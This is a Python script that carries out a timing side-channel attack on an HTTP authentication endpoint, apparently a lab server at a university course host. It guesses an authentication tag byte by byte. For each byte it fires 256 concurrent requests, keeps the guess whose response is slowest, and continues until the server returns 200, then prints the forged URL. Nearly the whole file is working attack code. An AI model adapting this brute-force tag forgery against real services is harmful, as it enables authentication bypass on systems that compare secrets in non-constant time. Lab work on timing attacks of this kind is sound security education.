import requests
from requests.exceptions import ConnectionError, Timeout
import time
import concurrent.futures
from statistics import fmean
import sys

#
#   Globals
#

DEBUG: bool = False
BASE_URL: str = "http://dart.cse.kau.se:12345/auth/"
HTTP_MAX_RETRIES: int = 100
HTTP_RETRY_SLEEP_BASE_IN_SECONDS: float = 0.8
HTTP_RETRY_SLEEP_FACTOR: float = 0.8
HTTP_TIMOUT_FACTOR: float = 1.5
THRESHOLD_LATENCY_FACTOR: float = 0.8
CONCURRENT_WORKERS: int = 16

# ANSI escape codes
ANSI_RESET = "\033[0m"
ANSI_BLACK = "\033[30m"
ANSI_RED = "\033[31m"
ANSI_GREEN = "\033[32m"
ANSI_YELLOW = "\033[33m"
ANSI_BLUE = "\033[34m"
ANSI_MAGENTA = "\033[35m"
ANSI_CYAN = "\033[36m"
ANSI_WHITE = "\033[37m"

#
#   Classes
#

class Auth:
    url: str
    user: str
    delay: float
    tag: list[int]
    tag_max_length: int
    elapsed_time_threshold: float
    elapsed_time_latency: float
    elapsed_time: float
    status_code: int
    threshold: float

    def __init__(self, user: str, delay: float, tag: list[int], latency: float):
        self.elapsed_time = 0.0
        self.status_code = 0
        self.tag_max_length = 32
        self.latency = latency
        self.user = user
        self.delay = delay
        self.tag = tag

        threshold_base = self.tag_length() * delay + latency
        self.threshold = threshold_base - (latency * THRESHOLD_LATENCY_FACTOR)

        tag_as_string = self.tag_as_string()
        self.url = f"{BASE_URL}{int(delay)}/{user}/{tag_as_string}"

    # If auth is sucessfull return True
    def ok(self) -> bool:
        return self.status_code == 200 or (self.elapsed_time >= self.threshold)
    
    def tag_length(self) -> int:
        return len([item for item in self.tag if isinstance(item, int)])
    
    def tag_as_string(self) -> str:
        string = ""
        # represent as string
        for hex_value in self.tag:
            if not isinstance(hex_value, int):
                hex_value = 0
            hex_value = hex(hex_value) # convert
            hex_value = hex_value[2:] # remove the two first characters which are "0x"
            hex_value = pad_string_with_zero(hex_value, 2)
            string += hex_value
        # pad string and return
        return pad_string_with_zero(string, self.tag_max_length)

    def run(self) -> None:
        retried: int = 0
        timeout: float = self.threshold + self.latency * HTTP_TIMOUT_FACTOR
        if timeout == 0.0:
            timeout = 30.0

        while retried < HTTP_MAX_RETRIES:
            retry_sleep_time: float = HTTP_RETRY_SLEEP_BASE_IN_SECONDS * HTTP_RETRY_SLEEP_FACTOR * retried
            try:
                start_time = time.time()
                response = requests.get(self.url, timeout=timeout)
                end_time = time.time()
                elapsed_time = (end_time - start_time) * 1000

                self.elapsed_time = elapsed_time
                self.status_code = response.status_code

                if DEBUG and self.ok():
                    color = ANSI_GREEN if self.ok() else ANSI_RESET
                    print(f'{color}0x{self.tag_as_string()}\t{"{:.2f}".format(self.elapsed_time)} ms\tlatency ~{"{:.2f}".format(self.latency)} ms\tthreshold {"{:.2f}".format(self.threshold)} ms{ANSI_RESET}')

                return None
            except ConnectionError as e:
                if DEBUG:
                    print(f"{ANSI_RED}Connection failed {e}{ANSI_RESET}")
                retried += 1
                if retried < HTTP_MAX_RETRIES:
                    if DEBUG:
                        print(f"Retrying in {retry_sleep_time} ms")
                    time.sleep(retry_sleep_time)
                else:
                    print(f"{ANSI_RED}Max retries of {HTTP_MAX_RETRIES} exceeded!{ANSI_RESET}")
                    break
            except Timeout as e:
                print(f"{ANSI_RED}Timeout of {timeout} ms exceeded.{ANSI_RESET}")
                retried += 1
                if retried < HTTP_MAX_RETRIES:
                    if DEBUG:
                        print(f"Retrying in {retry_sleep_time} ms")
                    time.sleep(retry_sleep_time)
                else:
                    print(f"{ANSI_RED}Max retries of {HTTP_MAX_RETRIES} exceeded!{ANSI_RESET}")
                    break

        # Failed!
        return None

#
#   Static functions
#

def pad_string_with_zero(input_str, target_length):
    while len(input_str) < target_length:
        input_str += '0'
    return input_str

def full_byte_range_with_prefix(prefix: list[int]) -> list[list[int]]:
    list_of_list = []
    for x in range(256):
        p = prefix.copy()
        p.append(x)
        list_of_list.append(p)

    return list_of_list

def auth_remove_duplicates(auths: list[Auth]):
    unique_auths: list[Auth] = []
    unique_tags: list[str] = []
    for auth in auths:
        tag_as_string: str = auth.tag_as_string()
        if tag_as_string not in unique_tags:
            unique_tags.append(tag_as_string)
            unique_auths.append(auth)
    return unique_auths

def run(user: str, delay: float, tag_prefix: list[int]) -> str:
    # Test latency to get a base value
    latencies: list[float] = []
    for _ in range(4):
        latency_test: Auth = Auth("", 0, [], 1000.0)
        latency_test.run()
        latencies.append(latency_test.elapsed_time)
    latency: float = fmean(latencies)

    # Prepare tasks
    auths: list[Auth] = []
    for tag in full_byte_range_with_prefix(tag_prefix):
        auths.append(Auth(user, delay, tag, latency))

    # Stop only if there is exaclty one OK auth
    while len([x for x in auths if x.ok()]) != 1:
        if DEBUG:
            print(f"{ANSI_YELLOW}Testing {len(auths)} tag prefixes{ANSI_RESET}")
        with concurrent.futures.ThreadPoolExecutor(CONCURRENT_WORKERS) as executor:
            uncompleted_futures = []
            for auth in auths:
                if [x for x in auths if x.ok() or len([x for x in auths if x.ok()]) == 0]:
                    uncompleted_futures.append(executor.submit(auth.run))

            concurrent.futures.wait(uncompleted_futures)
        auths = [x for x in auths if x.ok()]
    
        # We need to remove duplicates since for exameple 0x90 (144)
        # and 0x9 (9) are the same according to the timing
        # server (this is becouse we always pad tags with 0).
        auths = auth_remove_duplicates(auths)

        # Rare error
        # TODO fix
        if len(auths) == 0:
            if DEBUG:
                print(f"{ANSI_RED}No auths! Adjust THRESHOLD_LATENCY_FACTOR={THRESHOLD_LATENCY_FACTOR} or choose a higher delay.{ANSI_RESET}")
            return run(user, delay, tag_prefix)
            #exit(-1)
    
    # When there are exactly one OK auth in the list
    if auths[0].status_code == 200:
        # Done, status code is 200
        return auths[0].url
    else:
        print(f"{'{:.0f}'.format(float(auths[0].tag_length()) / float(auths[0].tag_max_length / 2) * 100)} % complete, please wait...")
        # Continue with next tag prefix
        return run(user, delay, auths[0].tag)

#
#   Main
#

if __name__ == "__main__":
    if len(sys.argv) > 2:
        user: str = str(sys.argv[1])
        delay: float = float(sys.argv[2])
        print(f"user:\t{user}\ndelay:\t{delay}\nStarting...")
        url: str = run(user, float(delay), [])
        print(f"Done!\nurl={url}")
    else:
        print(f"Usage:\tpython {sys.argv[0]} username delay_in_seconds")